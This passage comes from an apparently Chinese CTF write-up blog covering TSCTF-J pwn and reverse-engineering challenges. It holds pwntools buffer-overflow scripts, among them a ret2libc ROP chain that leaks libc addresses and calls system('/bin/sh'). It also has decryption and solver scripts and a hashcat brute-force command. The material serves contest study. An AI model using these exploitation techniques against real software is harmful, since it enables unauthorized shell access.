class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = connect(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">41541</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bkd = <span class=\"number\">0x400676</span></span><br><span class=\"line\">ret = <span class=\"number\">0x400501</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;n!&#x27;</span>, cyclic(<span class=\"number\">0x10</span>+<span class=\"number\">8</span>)+p64(ret)+p64(bkd))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-34.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{weLC0ME_to-TH3-WORld_Of-6INaRY-vuLNER@BIlItY0}</box></p>\n<h3 id=\"pwn-pop\" style=\"opacity:0.6;\">[pwn] pop （半成品）</h3>\n\n<p>静态分析，依然是一个无限溢出，但是连system都没有，考虑ret2libc</p>\n<p><img src=\"/image-35.png\" alt=\"alt text\"></p>\n<ol>\n<li>漏地址</li>\n</ol>\n<p>  发现vuln函数有一部分可以利用，可以先用gadget把puts的got传给rdi，接下来跳0x400633，然后获得puts地址和下一次溢出机会<br>  <img src=\"/image-36.png\" alt=\"alt text\"></p>\n<ol start=\"2\">\n<li>执行system(&quot;&#x2F;bin&#x2F;sh&quot;)</li>\n</ol>\n<p>接下来有了libc，就可以算出system的地址，也可以找到&#x2F;bin&#x2F;sh的字符串，然后就可以getshell啦~</p>\n<p>但是，问题来了，由于vuln的返回方式是leave<br>ret，两次操作下来相当于栈迁移了，栈跑到奇怪的地方了，试着把栈改到bss，但是没成功（不排除是我太菜了😅），下面给出代码（未成功）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = <span class=\"number\">0x601018</span></span><br><span class=\"line\">leak_addr = <span class=\"number\">0x400633</span></span><br><span class=\"line\">edi_ret = <span class=\"number\">0x400713</span></span><br><span class=\"line\">ret_only = <span class=\"number\">0x4004c9</span></span><br><span class=\"line\">rbp = <span class=\"number\">0x601090</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = gdb.debug(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;time!\\n&#x27;</span>,</span><br><span class=\"line\">cyclic(<span class=\"number\">0x10</span>)+p64(rbp)+p64(edi_ret)+p64(puts_got)+p64(leak_addr)+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_real = u64(io.recv(<span class=\"number\">8</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;0&#x27;</span>))</span><br><span class=\"line\">log.debug(<span class=\"string\">f&#x27;puts addr: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(puts_real)&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_to_real = <span class=\"keyword\">lambda</span> x: x - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>] + puts_real</span><br><span class=\"line\">log.debug(<span class=\"string\">f&#x27;Libc base: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(libc_to_real(<span class=\"number\">0</span>))&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">system_real = libc_to_real(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">bin_sh_real = libc_to_real(<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(cyclic(<span class=\"number\">0x10</span>)+p64(rbp)+p64(edi_ret)+p64(bin_sh_real)+p64(ret_only)+p64(system_real)+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{I_d0nt_kNovv}</box></p>\n<p><del>对了，因为卡这题了，所以后面的pwn都没有看了</del></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"re-Singin\"><a href=\"#re-Singin\" class=\"headerlink\" title=\"[re] Singin\"></a>[re] Singin</h3><p>先静态分析（下面一些函数是我自己命名的）</p>\n<p>首先，看到核心逻辑，Buf2是目标，Buf1是加密输出，进do_something看看</p>\n<p><img src=\"/image-37.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-38.png\" alt=\"alt text\"></p>\n<p>这里是一个异或加密，进b64e</p>\n<p><img src=\"/image-39.png\" alt=\"alt text\"></p>\n<p>一个”标准”的base64，但是有一个奇怪的函数，进change_charset</p>\n<p><img src=\"/image-40.png\" alt=\"alt text\"></p>\n<p>啊哈！这里把标准的字符集改掉了！所以这是一个自定义的base64，下面提取相关数据，因为我比较懒，就运行提取一下啦~</p>\n<p><img src=\"/image-41.png\" alt=\"alt text\"></p>\n<p>↑Buf2的值</p>\n<p>变换后的key<br>↓</p>\n<p><img src=\"/image-42.png\" alt=\"alt text\"></p>\n<p>上代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buf2 = [<span class=\"number\">0x23</span>,<span class=\"number\">0x7C</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x13</span>,<span class=\"number\">0x3D</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x12</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0xD</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x14</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x7A</span>,<span class=\"number\">0x2B</span>,<span class=\"number\">0x69</span>,<span class=\"number\">0x24</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x6B</span>,<span class=\"number\">0x76</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x42</span>,<span class=\"number\">0x28</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;w/w5t/YF0wUnwoQKwJt=&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(c^<span class=\"built_in\">ord</span>(key[i%<span class=\"built_in\">len</span>(key)])) <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(buf2)]))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-43.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{We1c@me_t0_TS_CTF_2025}</box></p>\n<h3 id=\"re-听绿的秘密\"><a href=\"#re-听绿的秘密\" class=\"headerlink\" title=\"[re] 听绿的秘密\"></a>[re] 听绿的秘密</h3><p>看了题目描述，还以为是苹果逆向，吓死了</p>\n<p>这道题考的是Java的自定义加载class</p>\n<p>先用Jadx打开，发现自定义加载了一个类，而主逻辑很可能就在这个类里面，所以第一步是恢复Secret类</p>\n<p><img src=\"/image-44.png\" alt=\"alt text\"></p>\n<p>看到上面的CustomClassLoader的定义</p>\n<p><img src=\"/image-45.png\" alt=\"alt text\"></p>\n<p>解密操作是给原文件里面的字节减7，先提取Secret.obf，下面用python完成解密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Secret.class&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(<span class=\"built_in\">bytes</span>((v - <span class=\"number\">7</span>)%<span class=\"number\">256</span> <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Secret.obf&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()))</span><br></pre></td></tr></table></figure>\n\n<p>接下来就用jadx打开还原的Secret.class，就能看到图片加密的逻辑了，然后就是解密图片</p>\n<p><img src=\"/image-46.png\" alt=\"alt text\"></p>\n<p>下面给出解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Where_is_my_cat.png&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()</span><br><span class=\"line\">cat = <span class=\"built_in\">bytearray</span>(content)</span><br><span class=\"line\">i2 = <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i3 <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(content)):</span><br><span class=\"line\">    i7 = content[i3]</span><br><span class=\"line\">    i = i7</span><br><span class=\"line\">    i5 = (i3+i2)%<span class=\"number\">8</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i5:</span><br><span class=\"line\">        i6 = ((i&gt;&gt;i5)|(i&lt;&lt;(<span class=\"number\">8</span>-i5))) &amp; <span class=\"number\">255</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        i6 = i</span><br><span class=\"line\">    i4 = (i6 - i2 - i3 % <span class=\"number\">251</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">    i2 = (i2 + i7 + <span class=\"number\">37</span>) &amp; <span class=\"number\">255</span></span><br><span class=\"line\">    cat[i3] = i4</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Cat.png&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(cat)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-47.png\" alt=\"alt text\"></p>\n<p>获得flag</p>\n<p><box>TSCTF-J{181_c3ntimeTer5?}</box></p>\n<h3 id=\"re-CryDancing\"><a href=\"#re-CryDancing\" class=\"headerlink\" title=\"[re] CryDancing\"></a>[re] CryDancing</h3><p>苹果逆向终究还是来了吗……</p>\n<p>上次在哪里的ipa逆向连可执行文件都没找到😅，这次总算找到了，先静态分析</p>\n<p><img src=\"/image-48.png\" alt=\"alt text\"></p>\n<p>从strings里面找到可能相关的字符串，进到了核心逻辑，大概就是把输入（obj）进行加密（YouCanSeeThisRight），然后与目标字符串对比，下面进到加密函数</p>\n<p><img src=\"/image-49.png\" alt=\"alt text\"></p>\n<p>这里先执行GetKey函数，然后把它重复四遍作为下面CCCrypt的密钥，经过搜索，这个应该是AES，用的是CBC模式，iv是375（小端），然后进到GetKey函数</p>\n<p><img src=\"/image-50.png\" alt=\"alt text\"></p>\n<p>反编出来的代码奇奇怪怪的，不过关键的是：这个函数返回四个大写字母，并且返回值的MD5是已知的，所以直接爆破</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 3 -m 0 674040176a34f6c994003fe85badfc48 ?u?u?u?u</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-51.png\" alt=\"alt text\"></p>\n<p>得到返回值：NOTD，也就是说，key就是NOTDNOTDNOTDNOTD</p>\n<p>下面用python恢复flag</p>\n<p><img src=\"/image-52.png\" alt=\"alt text\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = AES.new(<span class=\"string\">b&#x27;NOTDNOTDNOTDNOTD&#x27;</span>, AES.MODE_CBC, iv=(<span class=\"number\">375</span>).to_bytes(<span class=\"number\">16</span>, <span class=\"string\">&#x27;little&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(cipher.decrypt(base64.b64decode(<span class=\"string\">&#x27;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&#x27;</span>)))</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<p><box>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</box></p>\n<h3 id=\"re-哭泣之子\"><a href=\"#re-哭泣之子\" class=\"headerlink\" title=\"[re] 哭泣之子\"></a>[re] 哭泣之子</h3><p>这是什么新型的阴乐播放器吗（突然想起来传说中的O泡果奶病毒）</p>\n<p>拿到附件，发现这是一个.Net程序，用dnSpy打开，没有发现加密逻辑，然后就进行调试</p>\n<p><img src=\"/image-53.png\" alt=\"alt text\"></p>\n<p>在输出里发现了一行报错：找不到文件flag，那就肯定是核心逻辑了，在对应异常上下断点（调试-&gt;窗口-&gt;异常设置）</p>\n<p><img src=\"/image-54.png\" alt=\"alt text\"></p>\n<p>之后成功停下，再沿着调用堆栈往回翻，发现加密逻辑</p>\n<p><img src=\"/image-55.png\" alt=\"alt text\"></p>\n<p>接下来就是解密啦~</p>\n<p>因为这个不好直接解密（实际上也无法直接解密），所以使用z3求解，下面给出代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> z3</span><br><span class=\"line\">array3 = [<span class=\"number\">871</span>, <span class=\"number\">1654</span>, <span class=\"number\">789</span>, <span class=\"number\">1617</span>, <span class=\"number\">1221</span>, <span class=\"number\">2173</span>, <span class=\"number\">871</span>, <span class=\"number\">1724</span>, <span class=\"number\">629</span>, <span class=\"number\">1111</span>, <span class=\"number\">789</span>,</span><br><span class=\"line\"><span class=\"number\">1664</span>, <span class=\"number\">783</span>, <span class=\"number\">1579</span>, <span class=\"number\">989</span>, <span class=\"number\">1633</span>, <span class=\"number\">1229</span>, <span class=\"number\">2148</span>, <span class=\"number\">891</span>, <span class=\"number\">1703</span>, <span class=\"number\">1237</span>, <span class=\"number\">2249</span>, <span class=\"number\">1229</span>,</span><br><span class=\"line\"><span class=\"number\">2161</span>, <span class=\"number\">1157</span>, <span class=\"number\">2095</span>, <span class=\"number\">1237</span>, <span class=\"number\">2201</span>, <span class=\"number\">1243</span>, <span class=\"number\">2166</span>, <span class=\"number\">789</span>, <span class=\"number\">1604</span>, <span class=\"number\">941</span>, <span class=\"number\">1669</span>, <span class=\"number\">813</span>,</span><br><span class=\"line\"><span class=\"number\">1651</span>, <span class=\"number\">845</span>, <span class=\"number\">1633</span>, <span class=\"number\">807</span>, <span class=\"number\">1645</span>, <span class=\"number\">941</span>, <span class=\"number\">1673</span>, <span class=\"number\">971</span>, <span class=\"number\">1863</span>, <span class=\"number\">941</span>, <span class=\"number\">1648</span>, <span class=\"number\">789</span>, <span class=\"number\">1620</span>,</span><br><span class=\"line\"><span class=\"number\">941</span>, <span class=\"number\">1659</span>, <span class=\"number\">1255</span>, <span class=\"number\">2157</span>, <span class=\"number\">1167</span>, <span class=\"number\">2121</span>, <span class=\"number\">941</span>, <span class=\"number\">1647</span>, <span class=\"number\">807</span>, <span class=\"number\">1662</span>, <span class=\"number\">845</span>, <span class=\"number\">1634</span>,</span><br><span class=\"line\"><span class=\"number\">1243</span>, <span class=\"number\">2165</span>, <span class=\"number\">813</span>, <span class=\"number\">1650</span>, <span class=\"number\">941</span>, <span class=\"number\">1676</span>, <span class=\"number\">813</span>, <span class=\"number\">1697</span>, <span class=\"number\">783</span>, <span class=\"number\">1589</span>, <span class=\"number\">941</span>, <span class=\"number\">1654</span>, <span class=\"number\">1167</span>,</span><br><span class=\"line\"><span class=\"number\">2097</span>, <span class=\"number\">1255</span>, <span class=\"number\">2157</span>, <span class=\"number\">941</span>, <span class=\"number\">1673</span>, <span class=\"number\">789</span>, <span class=\"number\">1597</span>, <span class=\"number\">941</span>, <span class=\"number\">1655</span>, <span class=\"number\">941</span>, <span class=\"number\">1653</span>, <span class=\"number\">813</span>, <span class=\"number\">1673</span>,</span><br><span class=\"line\"><span class=\"number\">789</span>, <span class=\"number\">1598</span>, <span class=\"number\">891</span>, <span class=\"number\">1735</span>, <span class=\"number\">941</span>, <span class=\"number\">1600</span>, <span class=\"number\">629</span>, <span class=\"number\">1076</span>, <span class=\"number\">891</span>, <span class=\"number\">1728</span>, <span class=\"number\">603</span>, <span class=\"number\">1008</span>, <span class=\"number\">389</span>,</span><br><span class=\"line\"><span class=\"number\">827</span>]</span><br><span class=\"line\">a3o = array3[:]</span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">2</span>):</span><br><span class=\"line\">    solver = z3.Solver()</span><br><span class=\"line\">    a2k, a2kp1 = z3.BitVecs(<span class=\"string\">&#x27;a2k a2kp1&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">    solver.add(a2k&lt;=<span class=\"number\">125</span>)</span><br><span class=\"line\">    solver.add(a2kp1&lt;=<span class=\"number\">125</span>)</span><br><span class=\"line\">    solver.add(a2k&gt;=<span class=\"number\">32</span>)</span><br><span class=\"line\">    solver.add(a2kp1&gt;=<span class=\"number\">32</span>)</span><br><span class=\"line\">    num = a2k &lt;&lt; <span class=\"number\">3</span> ^ <span class=\"number\">83</span></span><br><span class=\"line\">    a2kn = (num + a2k ^ a2k + <span class=\"number\">72</span>)</span><br><span class=\"line\">    a2kp1n = a2kn + (num ^ a2kp1)</span><br><span class=\"line\">    solver.add(a2kn == array3[k])</span><br><span class=\"line\">    solver.add(a2kp1n == array3[k+<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> solver.check() == z3.sat</span><br><span class=\"line\">    array3[k] = solver.model()[a2k].as_long()</span><br><span class=\"line\">    array3[k+<span class=\"number\">1</span>] = solver.model()[a2kp1].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(array3))</span><br></pre></td></tr></table></figure>\n\n<p>当然，在没有提示之前，我写的范围是[0, 256)，解出来的flag长这样：</p>\n<p><img src=\"/image-56.png\" alt=\"alt text\"></p>\n<p>里正确答案只剩下两个字符（即一个方程组）了，当时太晚了，没有再想想就睡觉了，早上看到提示后就解出来了</p>\n<p>正确flag：</p>\n<p><box>flag{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</box></p>\n<p>注：判断完正误是有回显的，程序会修改NAudio.Midi.dll的前几字节</p>\n<p><img src=\"/image-57.png\" alt=\"alt text\"></p>\n<div>\n<img src=\"image-58.png\" style=\"float: right\">\n\n<p>又注：一开始把注意力放到提取阴乐的地方去了，发现还有一张png图片内嵌了（其实就是应用的图标），在这里放出来，吓💩你们<del>（bushi</del></p>\n</div>\n\n<h3 id=\"re-Catbits\"><a href=\"#re-Catbits\" class=\"headerlink\" title=\"[re] Catbits\"></a>[re] Catbits</h3><p>编程猫逆向？什么玩意儿（丢）</p>\n<p>其实这道题没那么难，只是逻辑不太好找而已，真正逆向很简单</p>\n<p>考虑到大家可能都没有学过编程猫（其实我也没学过），从配置环境开始</p>\n<ol>\n<li>安装Scratch</li>\n</ol>\n<p>一般情况我都是在官网下安装包的，奈何官网被ban了，那就从Microsoft Store凑合一下吧</p>\n<p><img src=\"/image-59.png\" alt=\"alt text\"></p>\n<ol start=\"2\">\n<li>打开项目</li>\n</ol>\n<p>启动程序，然后”文件”-&gt;“从电脑中打开”</p>\n<p><img src=\"/image-60.png\" alt=\"alt text\"></p>\n<ol start=\"3\">\n<li>查看代码逻辑</li>\n</ol>\n<p><img src=\"/image-61.png\" alt=\"alt text\"></p>\n<p>额……这有加密逻辑？输入都没找到啊，不会被隐藏了吧……</p>\n<p>如果你有这种想法，那就和我掉进一个坑里了</p>\n<p>我们可以看看.sb3（本质是.zip）里面的project.json，你其实会发现：它的代码是按人物存储的！比如下图，上面的blocks里面存储的就是”角色1”的代码，下面的blocks则是”角色3”的。那我们怎么看其他代码呢？</p>\n<p><img src=\"/image-62.png\" alt=\"alt text\"></p>\n<p>没错，在右边选其他角色就好了</p>\n<p><img src=\"/image-63.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-64.png\" alt=\"alt text\"></p>\n<p>（没错，就是这么简单粗暴）</p>\n<p>接下来就是还原代码逻辑了，不过可能确实有一段逻辑（orc-&gt;arc），通过简单测试，可以恢复，下面是用python重写的逻辑（有一些太啰嗦了，直接改写了，原逻辑被注释了）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src = [<span class=\"number\">211</span>, <span class=\"number\">717</span>, <span class=\"number\">210</span>, <span class=\"number\">132</span>, <span class=\"number\">193</span>, <span class=\"number\">114</span>, <span class=\"number\">244</span>, <span class=\"number\">208</span>, <span class=\"number\">213</span>, <span class=\"number\">99</span>, <span class=\"number\">37</span>, <span class=\"number\">214</span>, <span class=\"number\">224</span>, <span class=\"number\">101</span>, <span class=\"number\">98</span>, <span class=\"number\">212</span>, <span class=\"number\">224</span>, <span class=\"number\">118</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消息1</span></span><br><span class=\"line\">orc = []</span><br><span class=\"line\">arc = []</span><br><span class=\"line\">index = <span class=\"number\">1</span></span><br><span class=\"line\">end = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> end != <span class=\"number\">1</span>:</span><br><span class=\"line\">    answer = <span class=\"built_in\">input</span>()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> answer == <span class=\"string\">&#x27;#&#x27;</span>:</span><br><span class=\"line\">        end = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        orc.append(answer)</span><br><span class=\"line\">        index += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># nonomi</span></span><br><span class=\"line\"><span class=\"comment\"># 没有找到ToKo触发逻辑，根据调试，恢复如下</span></span><br><span class=\"line\">arc = [<span class=\"number\">114</span>] + [<span class=\"built_in\">ord</span>(c)+<span class=\"number\">1</span> <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> orc]</span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># Shiroko</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">Bravo</span>(<span class=\"params\">Amy</span>): <span class=\"comment\"># 就是(值+项数)%255</span></span><br><span class=\"line\">        <span class=\"keyword\">global</span> iNdex</span><br><span class=\"line\">        iNdex = yindex</span><br><span class=\"line\">        ij = arc[iNdex-<span class=\"number\">1</span>]</span><br><span class=\"line\">        kl = ij + Amy</span><br><span class=\"line\">        <span class=\"keyword\">if</span> kl &gt; <span class=\"number\">255</span>:</span><br><span class=\"line\">            mn = kl-<span class=\"number\">255</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            mn = kl</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mn</span><br><span class=\"line\">    arc[iNdex-<span class=\"number\">1</span>] = Bravo(yindex)</span><br><span class=\"line\">    yindex += <span class=\"number\">1</span> <span class=\"comment\"># PDF的WP这里好像漏了一行</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># murasame</span></span><br><span class=\"line\">    <span 